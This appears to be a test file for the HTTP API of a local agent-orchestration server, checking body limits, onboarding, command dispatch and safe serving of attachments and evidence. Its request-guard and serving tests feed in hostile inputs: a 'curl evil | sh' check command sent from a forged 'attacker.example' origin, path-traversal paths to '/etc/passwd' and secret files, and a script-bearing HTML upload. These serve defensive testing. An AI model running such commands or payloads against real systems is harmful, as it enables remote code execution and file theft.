import { afterEach, describe, expect, test } from 'bun:test';
import { writeFileSync } from 'node:fs';
import { join } from 'node:path';
import {
  type AgentModel,
  ENGINE_PROTOCOL,
  KNOWN_AGENT_PROVIDERS,
  type OnboardingFlow,
  type WorktreeUsage,
} from '@shinsa/core';
import type { ModelSource } from '../../../src/agents/index.ts';
import type { ServerConfig } from '../../../src/config/index.ts';
import { createWorktree } from '../../../src/git/index.ts';
import type { Launcher } from '../../../src/http/index.ts';
import type { EngineRestarter } from '../../../src/instance/index.ts';
import { createGitRepo, createTempDir, createTestOnboarding } from '../../helpers/index.ts';
import { disposeWebHandlers } from '../../helpers/web.ts';
import { startRoutes } from './harness.ts';

afterEach(disposeWebHandlers);

function createModels(models: AgentModel[]) {
  return { listModels: () => Promise.resolve(models) } as unknown as ModelSource;
}

function start(
  options: { config?: Partial<ServerConfig>; launch?: Launcher; restarter?: EngineRestarter } = {}
) {
  const routes = startRoutes(
    ({ engine, config }) => ({
      models: createModels([{ id: 'opus', label: 'Opus', description: 'x' }]),
      onboarding: createTestOnboarding(engine, config).onboarding,
      launch: options.launch,
      restarter: options.restarter,
    }),
    options.config
  );
  const { context } = routes;
  return Promise.resolve({
    config: context.config,
    engine: context.engine,
    transcripts: context.transcripts,
    evidence: context.evidence,
    base: routes.base,
    call: routes.send,
    send: routes.send,
    post: routes.post,
  });
}

async function startWithWorktree(launch?: Launcher) {
  const server = await start({ launch });
  const { repo } = await createGitRepo();
  const worktree = await createWorktree(repo, server.config.worktreesDir, 'task-xyz123', 'fix/thing', null);
  await server.engine.dispatch({
    type: 'repo.register',
    repo: { ...repo, checkCommands: [] },
    projectName: null,
  });
  const repoId = Object.keys(server.engine.state.repos)[0] ?? '';
  await server.engine.dispatch({ type: 'task.create', request: 'Fix the thing', repoId });
  const taskId = Object.keys(server.engine.state.tasks)[0] ?? '';
  await server.engine.dispatch({
    type: 'task.triage',
    taskId,
    title: 'Fix the thing',
    repoId,
    size: 'small',
    branch: 'fix/thing',
    waitsOn: [],
  });
  await server.engine.dispatch({
    type: 'worktree.ready',
    taskId,
    path: worktree.path,
    branch: worktree.branch,
  });
  return { ...server, taskId, worktree: worktree.path };
}

describe('request size', () => {
  test('a body over 8 MB is refused before it is read', async () => {
    const { post, engine } = await start();
    const response = await post('/api/commands', { type: 'task.create', request: 'x'.repeat(9_000_000) });
    expect(response.status).toBe(413);
    expect(Object.keys(engine.state.tasks)).toEqual([]);
  });

  test('a body sent without a length is still held to 8 MB once read', async () => {
    const { base, engine, send } = await start();
    const chunks = [
      Buffer.from('{"type":"task.create","request":"'),
      Buffer.alloc(9_000_000, 120),
      Buffer.from('"}'),
    ];
    const response = await send(`${base}/api/commands`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: new ReadableStream({
        pull(controller) {
          const chunk = chunks.shift();
          if (chunk) controller.enqueue(chunk);
          else controller.close();
        },
      }),
    });
    expect(response.status).toBe(400);
    expect(await response.text()).toContain('over 8 MB');
    expect(Object.keys(engine.state.tasks)).toEqual([]);
  });

  test('an attachment upload may be larger, up to its own limit', async () => {
    const { post } = await start();
    const data = Buffer.alloc(6_300_000).toString('base64');
    const uploaded = await post('/api/attachments', { name: 'big.bin', data });
    expect(uploaded.status).toBe(200);
    expect(await uploaded.json()).toMatchObject({ name: 'big.bin', size: 6_300_000 });
  });
});

describe('the health endpoint', () => {
  test('says whether the event log replayed cleanly, and which Shinsa answered from where', async () => {
    const { call, engine, config } = await start();
    expect(await (await call('/api/health')).json()).toEqual({
      ok: true,
      seq: engine.state.seq,
      problems: [],
      version: '0.0.0',
      protocol: ENGINE_PROTOCOL,
      busy: false,
      working: 0,
      restart: null,
      restartBy: null,
      commit: null,
      installPath: join(import.meta.dirname, '../../../../..'),
      dataDir: config.dataDir,
      pid: process.pid,
      startedAt: expect.any(Number),
      uptimeMs: expect.any(Number),
    });
  });
});

describe('the engine restart endpoint', () => {
  test('restarts the engine now or once agents are idle, when it runs in the background', async () => {
    const asked: string[] = [];
    const restarter = {
      request: (when: string) => {
        asked.push(when);
        return Promise.resolve({ restarting: when === 'now' });
      },
    } as unknown as EngineRestarter;
    const { post } = await start({ restarter });
    expect(await (await post('/api/engine/restart', { when: 'idle' })).json()).toEqual({ restarting: false });
    expect(await (await post('/api/engine/restart', { when: 'now' })).json()).toEqual({ restarting: true });
    expect(asked).toEqual(['idle', 'now']);
  });

  test('refuses an unknown moment, and a Shinsa that cannot restart from the app', async () => {
    const { post } = await start();
    const invalid = await post('/api/engine/restart', { when: 'later' });
    expect(invalid.status).toBe(400);
    expect(((await invalid.json()) as { error: { code: string } }).error.code).toBe('when_invalid');
    const unsupported = await post('/api/engine/restart', { when: 'now' });
    expect(((await unsupported.json()) as { error: { code: string } }).error.code).toBe(
      'restart_unsupported'
    );
  });
});

describe('the onboarding endpoints', () => {
  test('save the worktree folder, refuse one that is missing, and go back to the default', async () => {
    const { call, post, config } = await start();
    const mount = createTempDir('shinsa-bucket-');
    const saved = await post('/api/onboarding/worktrees', { path: mount });
    expect(await saved.json()).toMatchObject({ worktrees: { effective: mount, configured: mount } });
    const missing = await post('/api/onboarding/worktrees', { path: '/no/such/mount' });
    expect(missing.status).toBe(400);
    expect(await missing.json()).toEqual({
      error: {
        code: 'worktrees_invalid',
        message:
          'The worktree folder /no/such/mount does not exist. If it is on a drive you mount, mount it again, or choose another folder in Settings → Projects.',
      },
    });
    expect(await (await call('/api/onboarding')).json()).toMatchObject({ worktrees: { configured: mount } });
    const reset = await post('/api/onboarding/worktrees', { path: null });
    expect(await reset.json()).toMatchObject({
      worktrees: { effective: config.worktreesDir, configured: null, default: config.worktreesDir },
    });
  });

  test('measure the space the worktrees take in the folder in use', async () => {
    const { call, config } = await start();
    const usage = (await (await call('/api/onboarding/worktrees/usage')).json()) as WorktreeUsage;
    expect(usage).toMatchObject({ folder: config.worktreesDir, worktrees: 0, bytes: 0 });
    expect(usage.freeBytes).toBeGreaterThan(0);
  });

  test('report the status, suggest folders, save the setup, check the tools, and finish only through the steps', async () => {
    const { call, post, config, engine } = await start({ config: { roots: [] } });
    expect(await (await call('/api/onboarding')).json()).toMatchObject({
      completed: false,
      roots: { source: 'discovered', effective: [] },
    });
    expect(await (await call('/api/onboarding/roots?refresh=1')).json()).toEqual({
      suggestions: [],
      truncated: false,
      refused: [],
    });
    expect((await post('/api/onboarding/complete', {})).status).toBe(404);
    const saved = await post('/api/onboarding/setup', { roots: [config.home], mergeMethod: 'merge' });
    expect(await saved.json()).toMatchObject({ roots: { source: 'configured', configured: [config.home] } });
    expect(engine.state.settings.mergeMethod).toBe('merge');
    const refused = await post('/api/onboarding/setup', { roots: ['nope'] });
    expect(await refused.json()).toEqual({
      error: { code: 'roots_invalid', message: 'nope is not a full path.' },
    });
    for (const path of ['/api/onboarding/setup', '/api/onboarding/flow']) {
      expect(await (await post(path, [])).json()).toEqual({
        error: { code: 'body_invalid', message: 'The request body must be an object.' },
      });
    }
    const tools = (await (await call('/api/onboarding/prerequisites')).json()) as { ready: boolean };
    expect(tools.ready).toBe(true);
    expect(await (await post('/api/onboarding/privacy', {})).json()).toEqual({ ok: true });
    expect(await (await post('/api/onboarding/install', { id: 'gh' })).json()).toEqual({
      error: { code: 'browser_only', message: 'Only Shinsa’s own page installs the tools setup checks.' },
    });
    const install = await post('/api/onboarding/install', { id: 'gh' }, { origin: 'http://localhost:5181' });
    expect(((await install.json()) as { error: { code: string } }).error.code).toBe('terminals_off');
  });

  test('run the setup: the first step, an answer, going back, a refused answer and a stale one', async () => {
    const { call, post, config } = await start({ config: { roots: [] } });
    const opened = (await (await call('/api/onboarding/flow')).json()) as OnboardingFlow;
    expect(opened).toMatchObject({ index: 0, step: { id: 'roots', multiple: true, options: [] } });
    const projects = (await (
      await post('/api/onboarding/flow', { type: 'answer', stepId: 'roots', values: [config.home] })
    ).json()) as OnboardingFlow;
    expect(projects.step?.id).toBe('projects');
    const back = (await (
      await post('/api/onboarding/flow', { type: 'open', stepId: 'roots' })
    ).json()) as OnboardingFlow;
    expect(back.step?.options).toEqual([
      { value: config.home, label: '~', detail: null, chosen: true, recommended: false },
    ]);
    const refused = (await (
      await post('/api/onboarding/flow', { type: 'answer', stepId: 'roots', values: ['/no/such'] })
    ).json()) as OnboardingFlow;
    expect(refused.step).toMatchObject({ id: 'roots', problem: 'That is not a folder on this machine.' });
    const stale = await post('/api/onboarding/flow', {
      type: 'answer',
      stepId: 'defaults',
      values: ['merge=squash'],
    });
    expect(stale.status).toBe(400);
    expect(await stale.json()).toEqual({
      error: { code: 'step_stale', message: 'That step has closed.' },
    });
  });
});

describe('the request guard', () => {
  test('a foreign Host, a foreign Origin and a text/plain post are refused before anything runs', async () => {
    const { call } = await start();
    expect((await call('/api/queue', { headers: { host: 'attacker.example:5180' } })).status).toBe(403);
    expect((await call('/api/queue', { headers: { origin: 'https://attacker.example' } })).status).toBe(403);
    const simplePost = await call('/api/commands', {
      method: 'POST',
      headers: { 'content-type': 'text/plain' },
      body: JSON.stringify({
        type: 'repo.update',
        repoId: 'x',
        patch: { checkCommands: ['curl evil | sh'] },
      }),
    });
    expect(simplePost.status).toBe(415);
    expect((await call('/', { headers: { host: 'attacker.example' } })).status).toBe(403);
  });

  test('a request without an Origin, or from Shinsa’s own address, is taken without any key', async () => {
    const { post, engine } = await start();
    const task = { type: 'task.create', request: 'Add search', repoId: null };
    expect((await post('/api/commands', task)).status).toBe(200);
    expect((await post('/api/commands', task, { origin: 'http://localhost:5181' })).status).toBe(200);
    expect((await post('/api/commands', task, { origin: 'http://127.0.0.1:5180' })).status).toBe(200);
    expect((await post('/api/commands', task, { 'sec-fetch-site': 'cross-site' })).status).toBe(403);
    expect(Object.keys(engine.state.tasks)).toHaveLength(3);
  });
});

describe('commands', () => {
  test('a user command is dispatched and the new task id returned', async () => {
    const { post, engine } = await start();
    const response = await post('/api/commands', {
      type: 'task.create',
      request: 'Add search',
      repoId: null,
    });
    const body = (await response.json()) as { ok: boolean; taskId: string };
    expect(body.ok).toBe(true);
    expect(engine.state.tasks[body.taskId]?.request).toBe('Add search');
    expect(
      await (
        await post('/api/commands', { type: 'project.write', project: { name: 'A', color: 'blue' } })
      ).json()
    ).toEqual({
      ok: true,
      taskId: null,
      handle: null,
    });
  });

  test('every user command reaches the engine, including the ones only the task and settings pages send', async () => {
    const { post } = await start();
    const sent = [
      { type: 'suggestion.accept', taskId: 't', suggestionId: 's', waitsOnThis: false },
      { type: 'suggestion.dismiss', taskId: 't', suggestionId: 's' },
      { type: 'monitor.check_in_now', taskId: 't' },
      { type: 'run.snooze_silence', runId: 'r', until: 1 },
      { type: 'run.dismiss_silence', runId: 'r' },
      { type: 'schedule.enable', scheduleId: 's', enabled: false },
      { type: 'schedule.remove', scheduleId: 's' },
      { type: 'repo.remove', repoId: 'r' },
    ];
    for (const body of sent) {
      const answer = (await (await post('/api/commands', body)).json()) as { error?: { code: string } };
      expect(answer.error?.code ?? 'accepted').not.toBe('command_forbidden');
    }
  });

  test('system commands, junk and bad JSON are refused with a reason', async () => {
    const { post, call } = await start();
    for (const body of [{ type: 'run.end', runId: 'x' }, { type: 'repo.register' }, { type: 7 }]) {
      const response = await post('/api/commands', body);
      expect(response.status).toBe(400);
      expect(await response.json()).toEqual({
        error: { code: 'command_forbidden', message: 'Unknown command.' },
      });
    }
    for (const body of [null, 'task.create']) {
      expect(await (await post('/api/commands', body)).json()).toEqual({
        error: { code: 'command_invalid', message: 'A command must be an object.' },
      });
    }
    const broken = await call('/api/commands', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: '{',
    });
    expect(await broken.json()).toMatchObject({ error: { code: 'body_invalid' } });
    const rejected = await post('/api/commands', { type: 'task.create', request: ' ', repoId: null });
    expect(rejected.status).toBe(400);
  });

  test('a command sent again under the same Idempotency-Key is applied once and answers the same task', async () => {
    const { call, engine } = await start();
    const send = (key: string) =>
      call('/api/commands', {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'idempotency-key': key },
        body: JSON.stringify({ type: 'task.create', request: 'Add search', repoId: null }),
      });
    const first = (await (await send('k1')).json()) as { taskId: string };
    const again = (await (await send('k1')).json()) as { taskId: string };
    expect(again.taskId).toBe(first.taskId);
    expect(Object.keys(engine.state.tasks)).toEqual([first.taskId]);
    const tooLong = await send('k'.repeat(201));
    expect(tooLong.status).toBe(400);
    expect(await tooLong.json()).toEqual({
      error: { code: 'idempotency_key_invalid', message: 'The Idempotency-Key header is too long.' },
    });
  });
});

describe('read endpoints', () => {
  test('the queue, the models and unknown paths', async () => {
    const { call } = await start();
    expect(await (await call('/api/queue')).json()).toMatchObject({ decisions: [], working: [] });
    expect(await (await call('/api/models')).json()).toEqual([
      { id: 'opus', label: 'Opus', description: 'x' },
    ]);
    expect(await (await call('/api/providers')).json()).toEqual(KNOWN_AGENT_PROVIDERS);
    const missing = await call('/api/nothing');
    expect(missing.status).toBe(404);
    expect(
      (await call('/api/models', { method: 'POST', headers: { 'content-type': 'application/json' } })).status
    ).toBe(404);
  });

  test('an uploaded attachment is served back by its id and file name only', async () => {
    const { call, post } = await start();
    const response = await post('/api/attachments', {
      name: 'notes.txt',
      mimeType: 'text/plain',
      data: Buffer.from('hello').toString('base64'),
    });
    const attachment = (await response.json()) as { url: string; path: string; kind: string };
    expect(attachment.kind).toBe('file');
    const served = await call(attachment.url);
    expect(await served.text()).toBe('hello');
    expect(served.headers.get('cache-control')).toBe('private, max-age=31536000, immutable');
    expect((await call(attachment.url, { headers: { range: 'bytes=1-2' } })).status).toBe(206);
    expect((await call('/api/attachments/..%2Fshinsa.sqlite')).status).toBe(404);
    expect((await post('/api/attachments', { name: 'a.txt', data: '' })).status).toBe(400);
  });

  test('an uploaded page downloads in a sandbox and an image shows inline, neither can run script', async () => {
    const { call, post } = await start();
    const upload = async (name: string, mimeType: string, body: string) => {
      const response = await post('/api/attachments', {
        name,
        mimeType,
        data: Buffer.from(body).toString('base64'),
      });
      return call(((await response.json()) as { url: string }).url);
    };
    const page = await upload('report.html', 'text/html', '<script>fetch("/api/commands")</script>');
    expect(page.headers.get('content-type')).toStartWith('text/html');
    expect(page.headers.get('content-disposition')).toBe('attachment; filename="report.html"');
    expect(page.headers.get('content-security-policy')).toBe("default-src 'none'; sandbox");
    expect(page.headers.get('x-content-type-options')).toBe('nosniff');
    const image = await upload('shot.png', 'image/png', 'png bytes');
    expect(image.headers.get('content-disposition')).toBeNull();
    expect(image.headers.get('content-security-policy')).toBe("default-src 'none'; sandbox");
  });

  test('evidence is served by its task, round and name only, cached and in ranges', async () => {
    const { call, evidence, config } = await start();
    const uri = evidence.writeText('proof of work', { taskId: 'task-1', round: 1 }, 'Proof');
    writeFileSync(join(config.dataDir, 'secret.txt'), 'secret');
    const whole = await call(uri);
    expect(await whole.text()).toBe('proof of work');
    expect(whole.headers.get('cache-control')).toBe('private, max-age=31536000, immutable');
    expect(whole.headers.get('accept-ranges')).toBe('bytes');
    const ranged = (range: string) => call(uri, { headers: { range } });
    const middle = await ranged('bytes=6-7');
    expect(middle.status).toBe(206);
    expect(await middle.text()).toBe('of');
    expect(middle.headers.get('content-range')).toBe('bytes 6-7/13');
    expect(await (await ranged('bytes=9-')).text()).toBe('work');
    expect(await (await ranged('bytes=-4')).text()).toBe('work');
    expect(await (await ranged('bytes=0-99')).text()).toBe('proof of work');
    for (const range of ['bytes=20-30', 'bytes=-0', 'bytes=-', 'items=0-1', 'bytes=5-2']) {
      const refused = await ranged(range);
      expect(refused.status).toBe(416);
      expect(refused.headers.get('content-range')).toBe('bytes */13');
    }
    for (const path of [
      '/api/evidence/..%2Fsecret.txt',
      '/api/evidence/..',
      '/api/evidence/missing.png',
      '/api/evidence/task-1/round-1/missing.txt',
      '/api/evidence/task-1/..%2F..%2Fsecret.txt',
    ]) {
      expect((await call(path)).status).toBe(404);
    }
  });
});

describe('worktree endpoints', () => {
  test('open runs the editor at a line, Terminal or Finder, and nothing else', async () => {
    const launched: string[][] = [];
    const launch: Launcher = (command) => {
      launched.push(command);
      return Promise.resolve({ ok: true, code: 0, stdout: '', stderr: '', timedOut: false });
    };
    const { post, taskId, worktree, config } = await startWithWorktree(launch);
    config.editor = 'zed';
    const open = (body: unknown) => post(`/api/tasks/${taskId}/open`, body);
    expect(await (await open({ target: 'editor', path: 'README.md', line: 3 })).json()).toEqual({ ok: true });
    await open({ target: 'editor', path: 'README.md' });
    await open({ target: 'editor', path: '../../etc/passwd', line: 1.5 });
    await open({ target: 'terminal' });
    await open({ target: 'finder', path: 7 });
    expect((await open({ target: 'constructor' })).status).toBe(400);
    expect((await open(null)).status).toBe(400);
    expect((await post('/api/tasks/nope/open', { target: 'finder' })).status).toBe(404);
    expect(launched.map((command) => command.slice(0, 2).join(' '))).toEqual([
      `zed ${worktree}`,
      `zed ${worktree}`,
      `zed ${worktree}`,
      'open -a',
      `open ${worktree}`,
    ]);
    expect(launched[0]?.at(-1)?.endsWith('README.md:3')).toBe(true);
    expect(launched[1]?.at(-1)?.endsWith('README.md')).toBe(true);
    expect(launched[2]).toHaveLength(2);
    config.editor = null;
    await open({ target: 'editor' });
    expect(['code', 'cursor']).toContain(launched.at(-1)?.[0] ?? '');
  });

  test('the default launcher really runs the command', async () => {
    const log = join(createTempDir(), 'open.log');
    process.env.FAKE_OPEN_LOG = log;
    try {
      const { post, taskId } = await startWithWorktree();
      expect(await (await post(`/api/tasks/${taskId}/open`, { target: 'finder' })).json()).toEqual({
        ok: true,
      });
    } finally {
      delete process.env.FAKE_OPEN_LOG;
    }
  });
});
